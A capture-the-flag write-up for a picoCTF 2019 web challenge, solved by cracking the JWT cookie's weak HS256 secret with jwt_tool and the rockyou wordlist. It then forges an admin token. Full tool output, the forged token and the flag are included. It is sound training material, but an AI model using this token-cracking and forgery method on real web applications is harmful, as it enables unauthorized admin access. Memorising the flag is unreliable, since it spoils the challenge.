# Problem
Check the admin scratchpad! https://2019shell1.picoctf.com/problem/21893/ or http://2019shell1.picoctf.com:21893

## Hints:

What is that cookie?

Have you heard of JWT?

## Solution:

Lets go to the site:
![screenshot-1](./screenshot-1.png)

After logging in as ```roee```, we get this cookie:
![screenshot-2](./screenshot-2.png)
```javascript
jwt: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicm9lZSJ9.CoED0inBmPupk8TgsWR5nggpaKweY5P-28I67kWVYsM"
```

This is a [JSON Web Token](https://jwt.io/), trying to decode it with this site gives us:
![screenshot-3](./screenshot-3.png)

We just need to change the ```user``` to ```admin``` and to sign it with the ```secret key```.
Let's try to crack it against the [rockyou worklist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt),
we can use [this tool](https://github.com/ticarpi/jwt_tool) to tweak the token.

```bash
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

../../../tools/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicm9lZSJ9.CoED0inBmPupk8TgsWR5nggpaKweY5P-28I67kWVYsM ~/Downloads/rockyou.txt 

,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
----''----''----''----''----''----''----''----''----''----'
     ,--.,--.   ,--.,--------.,--------.             ,--.
     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
 `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
'----''----''----''----''----''----''----''----''----''----'

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] user = roee

######################################################
# Options:                                           #
# 1: Check CVE-2015-2951 - alg=None vulnerability    #
# 2: Check for Public Key bypass in RSA mode         #
# 3: Check signature against a key                   #
# 4: Check signature against a key file ("kid")      #
# 5: Crack signature with supplied dictionary file   #
# 6: Tamper with payload data (key required to sign) #
# 0: Quit                                            #
######################################################

Please make a selection (1-6)
> 5

Loading key dictionary...
File loaded: /home/roee/Downloads/rockyou.txt
Testing 14344380 passwords...
[+] ilovepico is the CORRECT key!
```

Nice, found the secret key: ```ilovepico```.

Now let's tweak:
```bash
python ../../../tools/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicm9lZSJ9.CoED0inBmPupk8TgsWR5nggpaKweY5P-28I67kWVYsM 

,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
----''----''----''----''----''----''----''----''----''----'
     ,--.,--.   ,--.,--------.,--------.             ,--.
     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
 `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
'----''----''----''----''----''----''----''----''----''----'

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] user = roee

######################################################
# Options:                                           #
# 1: Check CVE-2015-2951 - alg=None vulnerability    #
# 2: Check for Public Key bypass in RSA mode         #
# 3: Check signature against a key                   #
# 4: Check signature against a key file ("kid")      #
# 5: Crack signature with supplied dictionary file   #
# 6: Tamper with payload data (key required to sign) #
# 0: Quit                                            #
######################################################

Please make a selection (1-6)
> 6

Token header values:
[1] typ = JWT
[2] alg = HS256
[3] *ADD A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] user = roee
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of user is: roee
Please enter new value and hit ENTER
> admin
[1] user = admin
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token Signing:
[1] Sign token with known key
[2] Strip signature from token vulnerable to CVE-2015-2951
[3] Sign with Public Key bypass vulnerability
[4] Sign token with key file

Please select an option from above (1-4):
> 1

Please enter the known key:
> ilovepico

Please enter the keylength:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

Your new forged token:
[+] URL safe: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
[+] Standard: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe/JYEZTN19Vx6X9NNZtRVbKPBkhO+s
```

And we got tampered cookie: ```eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s```, let's update it:

Got it!

Flag: picoCTF{jawt_was_just_what_you_thought_c84a0d3754338763548dfc2dc171cdd0}
